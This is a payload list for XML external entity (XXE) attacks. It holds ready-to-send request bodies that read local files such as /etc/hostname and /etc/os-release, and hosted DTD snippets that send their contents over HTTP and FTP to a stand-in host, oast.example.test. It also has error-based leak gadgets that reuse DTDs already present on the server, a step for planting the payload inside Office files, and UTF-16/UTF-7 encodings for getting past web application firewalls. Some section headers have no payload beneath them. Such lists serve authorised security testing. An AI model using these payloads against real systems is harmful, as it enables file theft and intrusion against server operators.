# XXE Payloads
# Each block is an independent request body. Replace oast.example.test and app.example.test with hosts you control.

# Entity expansion detection (no external resource, safe first probe)

<?xml version="1.0"?><!DOCTYPE r [<!ENTITY a "xxe"><!ENTITY b "&a;-&a;">]><r>&b;</r>

# Blind XXE: out-of-band interaction with a parameter entity (use when general entities are blocked)

# Blind XXE: external DTD exfiltration (body sent to the target)
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % d SYSTEM "http://oast.example.test/ext.dtd"> %d;]><r>&exfil;</r>

# Blind XXE: hosted ext.dtd content (file on your server)
<!ENTITY % f SYSTEM "file:///etc/hostname"><!ENTITY % w "<!ENTITY exfil SYSTEM 'http://oast.example.test/?d=%f;'>">%w;

# Blind XXE: hosted ext.dtd, FTP variant for multi-line files
<!ENTITY % f SYSTEM "file:///etc/os-release"><!ENTITY % w "<!ENTITY exfil SYSTEM 'ftp://oast.example.test/%f;'>">%w;

# Error-based XXE: hosted ext.dtd leaks file content in a parser error message
<!ENTITY % f SYSTEM "file:///etc/hostname"><!ENTITY % e "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%f;'>">%e;%err;

# Error-based XXE: reuse a local DTD already on the server (no outbound traffic needed)
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % local SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"><!ENTITY % ISOamso '<!ENTITY &#x25; f SYSTEM "file:///etc/hostname"><!ENTITY &#x25; e "<!ENTITY &#x26;#x25; err SYSTEM &#x27;file:///nonexistent/&#x25;f;&#x27;>">&#x25;e;&#x25;err;'>%local;]><r>x</r>
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % local SYSTEM "file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd"><!ENTITY % condition 'aaa)><!ENTITY &#x25; f SYSTEM "file:///etc/hostname"><!ENTITY &#x25; e "<!ENTITY &#x26;#x25; err SYSTEM &#x27;file:///nonexistent/&#x25;f;&#x27;>">&#x25;e;&#x25;err;<!ELEMENT aa (bb'>%local;]><r>x</r>

# XInclude (use when you control only a value inside a server-built document)

# XLSX / DOCX / PPTX: add the DOCTYPE to [Content_Types].xml, xl/workbook.xml or word/document.xml inside the ZIP, then re-zip and upload

# Encoding tricks to evade naive WAF/keyword filters (re-encode the whole document)
# UTF-16 BE body: iconv -f UTF-8 -t UTF-16BE payload.xml > payload16.xml  (send with Content-Type: application/xml; charset=utf-16)
# UTF-7 body: iconv -f UTF-8 -t UTF-7 payload.xml > payload7.xml
<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]><r>&x;</r>
<?xml version="1.0" encoding="UTF-7"?>+ADw-!DOCTYPE r +AFs-+ADw-!ENTITY x SYSTEM +ACI-file:///etc/hostname+ACI-+AD4-+AF0-+AD4-+ADw-r+AD4-+ACY-x+ADs-+ADw-/r+AD4-
